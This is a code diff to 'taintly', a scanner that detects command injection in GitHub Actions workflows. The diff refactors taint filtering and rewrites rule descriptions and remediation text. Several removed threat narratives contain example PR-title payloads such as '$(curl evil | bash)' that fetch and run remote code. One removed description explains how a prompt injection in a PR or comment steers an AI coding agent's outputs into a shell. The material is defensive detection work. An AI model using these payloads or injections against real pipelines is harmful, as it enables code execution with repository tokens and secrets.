@@ -45,9 +45,11 @@ safely-quoted lint companion, and github-script JS injection.)
 from __future__ import annotations
 
 import re
-from dataclasses import dataclass, field
+from collections import Counter
+from dataclasses import dataclass, field, replace
 
 from taintly.models import ContextPattern, Platform, RegexPattern, Rule, Severity
+from taintly.shell_use import ShellUse, ShellUseEvidence, classify_shell_use
 from taintly.taint import TaintPath, _sink_is_safely_quoted
 from taintly.taint import analyze as taint_analyze
 from taintly.workflow_aware_pattern import PredicateContext, WorkflowAwarePattern
@@ -79,20 +81,11 @@ class TaintPattern:
     module constructs a :class:`TaintPattern` with its own
     ``kind_filter`` so the same analyzer pass services every rule.
 
-    ``sink_quote_filter`` partitions paths by whether the sink line
-    quotes the variable safely:
-
-      * ``"unsafe_only"``: keep paths where AT LEAST ONE reference is
-        unquoted, OR the line contains an eval-class re-parsing
-        command (``eval``, ``sh -c``, ``bash -c``, etc.). This is the
-        actual command-injection surface.
-      * ``"safely_quoted_only"``: keep paths where EVERY reference is
-        double-quoted AND no re-parsing command is present. The shell
-        passes the value as a single literal argument; injection is
-        only possible via a downstream consumer that re-parses the
-        string. Lint-grade finding.
-      * ``None`` (default): no quoting filter — return everything the
-        analyzer found.
+    ``sink_quote_filter`` preserves the legacy signal partition, except
+    that a supported code-bearing role always takes the execution route.
+    Quoting alone establishes neither code use nor downstream safety.
+    Each occurrence carries a separate source-bound CODE/DATA/UNKNOWN
+    witness; the engine qualifies the complete finding from that witness.
     """
 
     description: str = "env-mediated taint"
@@ -123,8 +116,11 @@ class TaintPattern:
     # chain — not literal source text.  This is the documented
     # exception to "snippet must be a substring of the cited line";
     # see taintly._pattern_contract.
-    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
-        out: list[tuple[int, str]] = []
+    def _selected_paths(
+        self, content: str, lines: list[str], file: str = ""
+    ) -> list[tuple[TaintPath, ShellUseEvidence | None]]:
+        """One deterministic selector shared by matching and occurrence binding."""
+        out: list[tuple[TaintPath, ShellUseEvidence | None]] = []
         allowed_sinks = (
             (self.sink_kind_filter,)
             if isinstance(self.sink_kind_filter, str)
@@ -140,6 +136,7 @@ class TaintPattern:
                 continue
             if self.kind_filter is not None and path.kind != self.kind_filter:
                 continue
+            evidence = classify_shell_use(content, path, file) if path.sink_kind == "run" else None
             if self.sink_quote_filter is not None:
                 # Last hop's name is the variable referenced at the sink.
                 var_name = path.hops[-1].name if path.hops else ""
@@ -150,11 +147,40 @@ class TaintPattern:
                 # only well-defined for plain shell variable names.
                 if var_name and "." not in var_name:
                     safely_quoted = _sink_is_safely_quoted(path.sink_snippet, var_name)
+                    if evidence is not None and evidence.disposition is ShellUse.CODE:
+                        safely_quoted = False
                     if self.sink_quote_filter == "unsafe_only" and safely_quoted:
                         continue
                     if self.sink_quote_filter == "safely_quoted_only" and not safely_quoted:
                         continue
-            out.append((path.sink_line, _format_chain(path)))
+            out.append((path, evidence))
+        return out
+
+    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
+        return [
+            (path.sink_line, _format_chain(path))
+            for path, _ in self._selected_paths(content, lines)
+        ]
+
+    def context_notes_for_matches(
+        self, content: str, file: str, matches: list[tuple[int, str]]
+    ) -> list[ShellUseEvidence | None]:
+        """Bind unique rendered matches; collisions cannot donate another path's role."""
+        selected = self._selected_paths(content, content.splitlines(), file)
+        pairs = [(path.sink_line, _format_chain(path)) for path, _ in selected]
+        counts = Counter(pairs)
+        match_counts = Counter(matches)
+        witnesses = {pair: evidence for pair, (_, evidence) in zip(pairs, selected, strict=True)}
+        out: list[ShellUseEvidence | None] = []
+        for match in matches:
+            evidence = witnesses.get(match)
+            if evidence is not None and (counts[match] != 1 or match_counts[match] != 1):
+                evidence = replace(
+                    evidence,
+                    disposition=ShellUse.UNKNOWN,
+                    reason="Rendered occurrence identity is ambiguous; shell use needs review.",
+                )
+            out.append(evidence)
         return out
 
 
@@ -245,29 +271,7 @@ class GithubScriptInterpolationPattern(WorkflowAwarePattern):
 # ---------------------------------------------------------------------------
 
 
-_TAINT_001_REMEDIATION = (
-    "An env: indirection is NOT sufficient on its own — the value is "
-    "still shell-expanded.  Treat the env var as untrusted data, never "
-    "code:\n"
-    "\n"
-    "  # BAD — still executes shell metacharacters in PR_TITLE\n"
-    "  env:\n"
-    "    PR_TITLE: ${{ github.event.pull_request.title }}\n"
-    '  run: echo "$PR_TITLE"\n'
-    "\n"
-    "  # GOOD — pipe through stdin, or write to a file and read it,\n"
-    "  # so the attacker-controlled value is never evaluated as a\n"
-    "  # shell fragment.\n"
-    "  env:\n"
-    "    PR_TITLE: ${{ github.event.pull_request.title }}\n"
-    "  run: |\n"
-    "    printenv PR_TITLE > /tmp/title\n"
-    "    some-tool --title-file /tmp/title\n"
-    "\n"
-    "If the run: step only needs to gate on the value, move the check "
-    "into an `if:` expression — those are evaluated by the GitHub "
-    "Actions expression engine, not by bash."
-)
+_TAINT_001_REMEDIATION = "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
 
 
 # ---------------------------------------------------------------------------
@@ -275,38 +279,7 @@ _TAINT_001_REMEDIATION = (
 # ---------------------------------------------------------------------------
 
 
-_TAINT_002_REMEDIATION = (
-    "This workflow launders an attacker-controlled value through one "
-    "or more `${{ env.X }}` indirections before feeding it to a "
-    "run: block.  Each hop makes the flow harder to see, but the "
-    "final shell expansion behaves exactly like the direct case — "
-    "whatever the attacker put in the source context is evaluated "
-    "by bash at the sink.\n"
-    "\n"
-    "  # BAD — chain of env references ending in a shell expansion\n"
-    "  env:\n"
-    "    RAW: ${{ github.event.pull_request.title }}\n"
-    "    TITLE: ${{ env.RAW }}\n"
-    '  run: echo "$TITLE"\n'
-    "\n"
-    "The safe pattern is the same as for TAINT-GH-001: never evaluate "
-    "the tainted string as a shell fragment.  Pick one:\n"
-    "\n"
-    "  # GOOD — read through a file, shell never sees the value\n"
-    "  env:\n"
-    "    TITLE: ${{ github.event.pull_request.title }}\n"
-    "  run: |\n"
-    "    printenv TITLE > /tmp/title\n"
-    "    some-tool --title-file /tmp/title\n"
-    "\n"
-    "  # GOOD — gate in an `if:` (expression engine, not bash)\n"
-    "  if: startsWith(github.event.pull_request.title, '[release]')\n"
-    "\n"
-    "If the multi-hop chain was there for readability, collapse it: "
-    "a single env assignment from the source context is no less safe "
-    "and is much easier for reviewers and future rule authors to "
-    "audit.  The chain itself does not add any defence."
-)
+_TAINT_002_REMEDIATION = "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
 
 
 # ---------------------------------------------------------------------------
@@ -314,56 +287,7 @@ _TAINT_002_REMEDIATION = (
 # ---------------------------------------------------------------------------
 
 
-_TAINT_003_REMEDIATION = (
-    "An earlier step wrote an attacker-controlled value into "
-    '$GITHUB_ENV (`echo "NAME=..." >> $GITHUB_ENV`), which the '
-    "runner persists into every subsequent step's environment.  A "
-    "later step then references $NAME in a shell run: block, which "
-    "bash expands — executing whatever the attacker put in the "
-    "source context.  The env: indirection is not a mitigation; the "
-    "$GITHUB_ENV bridge carries the raw string unchanged from one "
-    "step to the next.\n"
-    "\n"
-    "  # BAD — launders PR title into $GITHUB_ENV, later step expands it\n"
-    "  - env:\n"
-    "      RAW: ${{ github.event.pull_request.title }}\n"
-    '    run: echo "TITLE=$RAW" >> $GITHUB_ENV\n'
-    '  - run: echo "title is $TITLE"\n'
-    "\n"
-    "Fix options (pick the first that applies):\n"
-    "\n"
-    "  # GOOD — drop the $GITHUB_ENV bridge entirely; pass the value\n"
-    "  # directly via the sink step's own env: block and read it\n"
-    "  # through a file so bash never sees the string.\n"
-    "  - env:\n"
-    "      TITLE: ${{ github.event.pull_request.title }}\n"
-    "    run: |\n"
-    "      printenv TITLE > /tmp/title\n"
-    "      some-tool --title-file /tmp/title\n"
-    "\n"
-    "  # GOOD — use explicit step outputs (declare the schema) + a\n"
-    "  # safe consumer, so the later step reads the value through an\n"
-    "  # expression rather than the process environment.  Combine\n"
-    "  # with a file-based consumer to avoid shell expansion.\n"
-    "  - id: extract\n"
-    '    run: echo "title=$RAW" >> "$GITHUB_OUTPUT"\n'
-    "    env:\n"
-    "      RAW: ${{ github.event.pull_request.title }}\n"
-    "  - env:\n"
-    "      TITLE: ${{ steps.extract.outputs.title }}\n"
-    "    run: printenv TITLE > /tmp/title && some-tool --title-file /tmp/title\n"
-    "\n"
-    "  # GOOD — if the value only gates control flow, use `if:` on\n"
-    "  # the consuming step; the Actions expression engine evaluates\n"
-    "  # it safely, no shell involved.\n"
-    "  - if: startsWith(github.event.pull_request.title, '[release]')\n"
-    "    run: ./release.sh\n"
-    "\n"
-    "Never combine `>> $GITHUB_ENV` with attacker-controlled data.  "
-    "The runner treats $GITHUB_ENV as authoritative configuration, "
-    "so anything the attacker writes there becomes indistinguishable "
-    "from legitimate job state for the rest of the job."
-)
+_TAINT_003_REMEDIATION = "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
 
 
 # ---------------------------------------------------------------------------
@@ -371,67 +295,7 @@ _TAINT_003_REMEDIATION = (
 # ---------------------------------------------------------------------------
 
 
-_TAINT_004_REMEDIATION = (
-    "An earlier step wrote an attacker-controlled value into "
-    "``$GITHUB_OUTPUT`` (or the legacy ``::set-output`` form), and a "
-    "later step references the value via "
-    "``${{ steps.<id>.outputs.<name> }}`` inside a shell ``run:`` "
-    "block.  GitHub Actions substitutes the output value into the run "
-    "text at workflow-parse time — *before* bash sees the line — so "
-    "the attacker's bytes land directly in the shell command line.  "
-    "Whatever the attacker put in the source context (PR title, "
-    "comment body, branch name, ...) is then evaluated by bash with "
-    "the runner's full GITHUB_TOKEN and secret access.\n"
-    "\n"
-    "  # BAD — outputs bridge the steps; the consumer expression\n"
-    "  # interpolates straight into bash.\n"
-    "  - id: extract\n"
-    "    env:\n"
-    "      RAW: ${{ github.event.pull_request.title }}\n"
-    '    run: echo "title=$RAW" >> "$GITHUB_OUTPUT"\n'
-    '  - run: echo "${{ steps.extract.outputs.title }}"\n'
-    "\n"
-    "Fix options (pick the first that applies):\n"
-    "\n"
-    "  # GOOD — drop the output bridge; pass the value to the consumer\n"
-    "  # via env: and read it through a file so bash never sees it as\n"
-    "  # a substituted string.\n"
-    "  - env:\n"
-    "      TITLE: ${{ github.event.pull_request.title }}\n"
-    "    run: |\n"
-    "      printenv TITLE > /tmp/title\n"
-    "      some-tool --title-file /tmp/title\n"
-    "\n"
-    "  # GOOD — keep the output but consume it through env: in the\n"
-    "  # downstream step, so the substituted value lands in a shell\n"
-    "  # variable and never in the rendered command line.  Combine\n"
-    "  # with a file-based reader so the variable is never expanded\n"
-    "  # back into the shell as code.\n"
-    "  - id: extract\n"
-    '    run: echo "title=$RAW" >> "$GITHUB_OUTPUT"\n'
-    "    env:\n"
-    "      RAW: ${{ github.event.pull_request.title }}\n"
-    "  - env:\n"
-    "      TITLE: ${{ steps.extract.outputs.title }}\n"
-    "    run: printenv TITLE > /tmp/title && some-tool --title-file /tmp/title\n"
-    "\n"
-    "  # GOOD — for control flow, gate in `if:` so the expression\n"
-    "  # engine evaluates the value safely (no shell involved).\n"
-    "  - if: startsWith(steps.extract.outputs.title, '[release]')\n"
-    "    run: ./release.sh\n"
-    "\n"
-    "Two extra notes specific to step outputs:\n"
-    "\n"
-    "* The legacy ``::set-output`` form has been deprecated by GitHub "
-    "but is still accepted by the runner.  Migrate to "
-    "``$GITHUB_OUTPUT`` regardless — the warning ``Set-output is "
-    "deprecated and will be removed`` is real, and the new form makes "
-    "the data flow easier to audit because the redirect is visible.\n"
-    "* If the output is *only* ever consumed inside an ``if:`` "
-    "expression (e.g. branch-name predicates), no shell expansion "
-    "happens and TAINT-GH-004 will not fire.  This is the safe "
-    "consumption pattern."
-)
+_TAINT_004_REMEDIATION = "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
 
 
 # ---------------------------------------------------------------------------
@@ -442,24 +306,12 @@ _TAINT_004_REMEDIATION = (
 RULES = [
     Rule(
         id="TAINT-GH-001",
-        title=("Attacker-controlled context flows through env var into run: block (shallow taint)"),
+        title=("Attacker-controlled value reaches a shell code-bearing role (shallow taint)"),
         severity=Severity.CRITICAL,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A GitHub-Actions context an external actor can influence "
-            "(PR title/body, issue body, comment body, commit message, "
-            "head_ref, ...) is assigned to a step or job env: variable, "
-            "and that env: variable is subsequently expanded inside a "
-            "run: block in the same job.  SEC4-GH-004's line-local "
-            "regex only flags direct ${{ ... }} interpolation inside "
-            "run: — it cannot see the env: indirection that many "
-            "workflows use, mistakenly believing it is a mitigation.  "
-            "At shell time the tainted string is expanded by bash/sh, "
-            "so an attacker who injects shell metacharacters (e.g. "
-            "`$(curl evil | bash)`) into the source context gets code "
-            "execution with the job's full GITHUB_TOKEN permissions "
-            "and secrets."
+            "A tracked workflow value reaches a run: command through an environment assignment. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access."
         ),
         pattern=TaintPattern(
             kind_filter="shallow",
@@ -584,39 +436,19 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "An attacker opens a PR whose title is "
-            '`"$(curl evil.sh | bash) #`.  The workflow copies that '
-            "title into an env: variable — which the author believed "
-            "was a mitigation — and a later run: step evaluates "
-            '`echo "$PR_TITLE"` in bash, executing the injected '
-            "command-substitution with the runner's full privileges."
+            "Trace the source through an environment assignment to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately."
         ),
         incidents=["Ultralytics (Dec 2024)"],
         confidence="high",
     ),
     Rule(
         id="TAINT-GH-002",
-        title=(
-            "Attacker-controlled context reaches run: through multi-hop "
-            "env propagation (deep taint)"
-        ),
+        title=("Attacker-controlled value reaches a shell code-bearing role (multi-hop taint)"),
         severity=Severity.CRITICAL,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A chain of env-variable assignments launders an "
-            "attacker-controlled GitHub context through one or more "
-            "`${{ env.X }}` indirections before the value lands in a "
-            "run: block.  TAINT-GH-001 only catches the direct "
-            "`env: VAR: ${{ tainted }}` -> `run: $VAR` flow; this rule "
-            "catches `A -> B -> ... -> run: $FINAL`.  The added "
-            "indirection hides the flow from reviewers and from "
-            "naïve line-local regex rules, but at shell time the "
-            "final variable still expands to whatever the attacker "
-            "wrote into the source context — so bash sees, and "
-            "executes, the injected payload.  The finding snippet "
-            "contains the full hop chain so the reviewer can see "
-            "exactly which env assignments carried the taint."
+            "A tracked workflow value reaches a run: command through multiple environment indirections. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access."
         ),
         pattern=TaintPattern(
             kind_filter="multi_hop",
@@ -708,41 +540,19 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "A maintainer writes `TITLE: ${{ env.RAW }}` believing the "
-            "extra level of indirection sanitises the PR title.  It "
-            "does not — the chain resolves at run time to the raw "
-            "attacker string, which bash then expands when the run: "
-            "step references $TITLE.  An attacker crafts a PR title "
-            'of `"; curl evil | bash ; #` and the workflow executes '
-            "the injected command with the runner's GITHUB_TOKEN."
+            "Trace the source through multiple environment indirections to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately."
         ),
         incidents=[],
         confidence="high",
     ),
     Rule(
         id="TAINT-GH-003",
-        title=(
-            "Attacker-controlled context persisted into $GITHUB_ENV "
-            "reaches run: in a later step (deep taint)"
-        ),
+        title=("Attacker-controlled value reaches a shell code-bearing role through GITHUB_ENV"),
         severity=Severity.CRITICAL,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A step launders an attacker-controlled GitHub context "
-            'into the job\'s environment via `echo "NAME=..." >> '
-            "$GITHUB_ENV`.  The Actions runner materialises that "
-            "file as real environment variables *between steps*, so "
-            "every subsequent step in the job starts with the "
-            "tainted NAME in its process environment.  A later "
-            "`run: $NAME` (or `${NAME}` or `${{ env.NAME }}`) then "
-            "expands the attacker's string in bash.  SEC4-GH-006 "
-            "catches the direct `${{ tainted }} >> $GITHUB_ENV` "
-            "form only on the same line; this rule closes the gap "
-            "where the tainted value reaches the `>> $GITHUB_ENV` "
-            "through an env: indirection first, or where the write "
-            'uses a shell variable (`echo "TITLE=$RAW" >> '
-            "$GITHUB_ENV` after `RAW: ${{ github.event.pr.title }}`)."
+            "A tracked workflow value reaches a run: command through a GITHUB_ENV bridge. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access."
         ),
         pattern=TaintPattern(
             kind_filter="github_env",
@@ -847,43 +657,19 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "Step 1 copies the PR title into $RAW, then pipes "
-            '`"TITLE=$RAW" >> $GITHUB_ENV`.  Step 2 inherits '
-            "$TITLE in its shell environment and evaluates "
-            '`echo "$TITLE"`.  The attacker\'s PR title '
-            '`"; curl evil | bash ; #` executes in bash with the '
-            "runner's GITHUB_TOKEN and every other secret the job "
-            "can see.  The `$GITHUB_ENV` bridge is especially "
-            "dangerous because workflows that look clean when read "
-            "step-by-step can still carry taint across steps via "
-            "the runner's state."
+            "Trace the source through a GITHUB_ENV bridge to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately."
         ),
         incidents=[],
         confidence="high",
     ),
     Rule(
         id="TAINT-GH-004",
-        title=(
-            "Attacker-controlled context persisted into $GITHUB_OUTPUT "
-            "reaches a downstream step's expression context (deep taint)"
-        ),
+        title=("Attacker-controlled step output reaches shell source"),
         severity=Severity.CRITICAL,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A step with ``id:`` writes attacker-controlled data to "
-            "``$GITHUB_OUTPUT`` (or the legacy ``::set-output`` form), "
-            "and a later step references the value via "
-            "``${{ steps.<id>.outputs.<name> }}`` inside a shell "
-            "``run:`` block.  GitHub Actions interpolates the output "
-            "value into the run text *at workflow-parse time* — "
-            "before bash sees the line — so the attacker's bytes land "
-            "directly in the rendered shell command line.  This is the "
-            "step-output sibling of TAINT-GH-003: SEC4-GH-004 only "
-            "catches direct ``${{ context }}`` injection inside a "
-            "``run:``; this rule catches the case where the attacker "
-            "value is staged through an output and consumed in a "
-            "later step's ``run:`` expression interpolation."
+            "A tracked workflow value reaches a run: command through a step-output bridge. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access."
         ),
         pattern=TaintPattern(kind_filter="step_output"),
         remediation=_TAINT_004_REMEDIATION,
@@ -992,16 +778,7 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "Step ``extract`` copies the PR title into $RAW, then "
-            "writes ``title=$RAW`` to ``$GITHUB_OUTPUT``.  The output "
-            "becomes referenceable as "
-            "``${{ steps.extract.outputs.title }}``.  A later step "
-            "uses that expression inside a ``run:`` line, where the "
-            "Actions engine substitutes the value before bash runs.  "
-            "The attacker's PR title "
-            '``"; curl evil | bash ; #`` is now a literal fragment '
-            "of the rendered shell command and executes with the "
-            "runner's GITHUB_TOKEN."
+            "Trace the source through a step-output bridge to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately."
         ),
         incidents=[],
         confidence="high",
@@ -1011,55 +788,16 @@ RULES = [
     # ---------------------------------------------------------------------------
     Rule(
         id="TAINT-GH-005",
-        title=("AI agent step output flows into a shell run: block (steps.<agent-id>.outputs.*)"),
+        title=("Coding-agent output reaches shell source (review)"),
         severity=Severity.HIGH,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A step whose ``uses:`` points at an AI coding-agent "
-            "action (claude-code, aider, openhands, coderabbit, "
-            "cursor, ai-review, gpt-pr, ai-code-review, openai-"
-            "action, anthropic-action, llm-agent) carries an "
-            "``id:`` and a later step references "
-            "``${{ steps.<id>.outputs.<name> }}`` inside a shell "
-            "``run:`` block. "
-            "Same flow shape as TAINT-GH-004 but with the agent as "
-            "the source: the agent's declared outputs are "
-            "attacker-shaped whenever a prompt-injection payload "
-            "reaches the model (via PR body, comment, review, or "
-            "the agent's own read tools). The GitHub Actions engine "
-            "substitutes the value into the run: text at workflow-"
-            "parse time, so the attacker-controlled bytes land "
-            "directly in the shell command line — with the "
-            "workflow's full GITHUB_TOKEN and any bound secrets. "
-            "Provenance chain example: "
-            "``agent:anthropics/claude-code-action -> steps.review"
-            '.outputs.summary -> echo "${{ steps.review.outputs'
-            '.summary }}"``.'
+            "A tracked workflow value reaches a run: command through a coding-agent output bridge. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access."
         ),
         pattern=TaintPattern(kind_filter="agent_output"),
         remediation=(
-            "Do not feed agent step outputs into a shell ``run:`` "
-            "block without validation:\n"
-            "\n"
-            "1. Have the agent emit a strictly-shaped JSON file "
-            "   (``outputs.json``), then consume specific fields via "
-            "   ``jq -r '.decision' outputs.json`` after an "
-            "   allow-list check.\n"
-            "\n"
-            "2. Never write agent output to ``$GITHUB_ENV`` or "
-            "   ``$GITHUB_OUTPUT`` unconditionally — both pass "
-            "   through to downstream shell without escaping.\n"
-            "\n"
-            "3. Scope the agent's tool surface (``--allowedTools``) "
-            "   so the outputs a caller could reasonably receive "
-            "   come from a narrow set of pre-approved tools, not "
-            "   from a freeform reasoning pass.\n"
-            "\n"
-            "See AI-GH-014 for the shallow precondition check "
-            "(agent action + step-output in shell), and AI-GH-005 / "
-            "AI-GH-006 for the prompt-injection-surface side of the "
-            "same attack."
+            "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
         ),
         reference="https://simonwillison.net/2023/May/2/prompt-injection/",
         test_positive=[
@@ -1119,17 +857,7 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "An attacker opens a PR, comment, or review whose body "
-            "contains a prompt-injection payload. The AI agent — "
-            "via its own read tools — ingests the payload and emits "
-            "attacker-chosen text in its declared step outputs. A "
-            "downstream ``run:`` that consumes "
-            "``${{ steps.review.outputs.X }}`` renders that text "
-            "into a shell command line. No taint source in the YAML "
-            "itself; the provenance chain starts at the agent "
-            "package and ends at bash, the same 'step output as "
-            "taint bridge' shape TAINT-GH-004 handles for "
-            "``$GITHUB_OUTPUT`` writes."
+            "Trace the source through a coding-agent output bridge to the exact owned run: command. An attacker-influenced value used as shell source, command name or interpreter input can affect execution if the event, guards and runtime conditions permit it. A data argument or assignment is a different role; unsupported consumption remains unresolved. Verify source control, shell semantics and available authority separately."
         ),
         incidents=[],
         confidence="high",
@@ -1619,67 +1347,16 @@ RULES = [
     # outputs, just one level up the workflow's job DAG.
     Rule(
         id="TAINT-GH-009",
-        title=(
-            "Attacker-controlled context flows across jobs via "
-            "needs.<job>.outputs.<name> into a shell run: block"
-        ),
+        title=("Attacker-controlled job output reaches shell source"),
         severity=Severity.CRITICAL,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A producer job's declared ``outputs:`` block exposes a "
-            "value derived from an attacker-controlled GitHub context "
-            "(``github.event.pull_request.title``, ``github.head_ref``, "
-            "issue / comment / review bodies, ...).  A consumer job "
-            "that ``needs:`` the producer references the value via "
-            "``${{ needs.<j>.outputs.<n> }}`` — either inlined into a "
-            "``run:`` line, or laundered through one or more env "
-            "assignments before reaching the shell.  GitHub Actions "
-            "interpolates the producer's output into the consumer's "
-            "run text at workflow-parse time, so the attacker bytes "
-            "land directly in the shell command line with the consumer "
-            "job's full GITHUB_TOKEN and bound secrets.  This is the "
-            "cross-job analog of TAINT-GH-004 and the dominant shape "
-            "behind real-world incidents that chain through multiple "
-            "jobs (Ultralytics-class).  The consumer often runs at "
-            "elevated privilege (release / publish / IaC apply) "
-            "precisely because the producer's job was scoped down, "
-            "making the attack worse, not better."
+            "A tracked workflow value reaches a run: command through a declared cross-job output bridge. Under the supported configured shell profile, CODE means source interpolation, command selection, a supported interpreter code operand or interpreter stdin. Ordinary parameter expansion as data does not recursively execute syntax in the value. The occurrence is qualified as review-needed when use is DATA or UNKNOWN. Configured code use alone does not establish actual triggering, attacker control, successful execution or effective token and secret access."
         ),
         pattern=TaintPattern(kind_filter="cross_job"),
         remediation=(
-            "Treat every ``needs.<j>.outputs.<n>`` as untrusted "
-            "data:\n"
-            "\n"
-            "1. Don't interpolate the output directly in ``run:``. "
-            "   Bind it to a quoted env var first and reference the "
-            "   variable, never the substitution:\n"
-            "\n"
-            "       env:\n"
-            '         RAW: "${{ needs.produce.outputs.summary }}"\n'
-            '       run: ./tool "$RAW"\n'
-            "\n"
-            "2. Validate at the producer's outputs: boundary instead "
-            "   of the consumer's sink — strip / allow-list / hash "
-            "   the value before it leaves the producer job, so every "
-            "   downstream consumer inherits the safe shape:\n"
-            "\n"
-            "       outputs:\n"
-            "         safe_title: ${{ steps.validate.outputs.safe }}\n"
-            "       steps:\n"
-            "         - id: validate\n"
-            "           env:\n"
-            "             RAW: ${{ github.event.pull_request.title }}\n"
-            "           run: |\n"
-            '             SAFE=$(printf "%s" "$RAW" | tr -dc "[:alnum:]_- ")\n'
-            '             echo "safe=$SAFE" >> $GITHUB_OUTPUT\n'
-            "\n"
-            "3. If the producer must forward raw attacker bytes (e.g. "
-            "   to a downstream tool that handles untrusted input), "
-            "   ensure the consumer never reaches ``run:`` — pass via "
-            "   ``with:`` to an action that consumes typed inputs, "
-            "   not via shell.  See TAINT-GH-006/007 for the "
-            "   ``workflow_call`` analog of this discipline."
+            "Keep untrusted values as data. Bind the value with env: and use a quoted argument with a literal format, for example: run: printf '%s\\n' \"$TITLE\". Parameter expansion does not recursively execute syntax inside the value, but unquoted arguments can split words and expand file globs. Do not put the value in command position, eval, shell -c, other interpreter code operands, or a pipe into an interpreter. A file or stdin is only a data boundary when the consumer treats it as data. Avoid ${{ env.TITLE }}, step-output or needs-output substitution inside run: text: Actions renders those bytes before shell parsing. Trace every propagation hop, inspect downstream options and validate the configured shell. Verify event guards, caller control and effective credentials separately."
         ),
         reference="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions",
         test_positive=[
@@ -1809,19 +1486,7 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
